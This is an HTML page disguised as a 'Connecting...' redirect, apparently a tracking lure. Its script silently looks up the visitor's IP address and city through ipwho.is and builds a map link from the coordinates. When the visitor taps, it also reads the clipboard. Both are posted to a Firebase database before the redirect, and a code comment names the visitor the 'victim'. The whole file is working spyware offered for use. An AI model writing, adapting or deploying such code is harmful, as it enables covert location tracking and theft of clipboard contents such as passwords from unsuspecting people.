<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <style>
        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    </style>
</head>
<body>
    <div id="status">Loading...</div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function start() {
            const urlParams = new URLSearchParams(window.location.search);
            const id = urlParams.get('id');
            if(!id) return document.getElementById('status').innerText = "Invalid Link";

            try {
                // Decode the JSON payload
                const decoded = JSON.parse(atob(id));
                const userKey = decoded.k;
                const targetUrl = decoded.r;

                // 1. Get Location
                let info = { time: new Date().toLocaleString() };
                try {
                    const res = await fetch('https://ipwho.is/');
                    const d = await res.json();
                    info.ip = d.ip;
                    info.loc = d.city;
                    info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                } catch(e) {}

                // Send to Firebase (Wait for it)
                await fetch(`${DB_URL}tracking/${userKey}.json`, {
                    method: 'POST',
                    body: JSON.stringify(info)
                });

                // 2. Clipboard on click
                document.body.onclick = async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        if(text) {
                            await fetch(`${DB_URL}clipboard/${userKey}.json`, {
                                method: 'POST',
                                body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() })
                            });
                        }
                    } catch(e) {}
                    window.location.href = targetUrl;
                };

                // Show instruction to victim
                document.getElementById('status').innerText = "Tap screen to continue...";

            } catch(e) {
                console.error(e);
                document.getElementById('status').innerText = "Error Occurred.";
            }
        }
        start();
    </script>
</body>
</html>
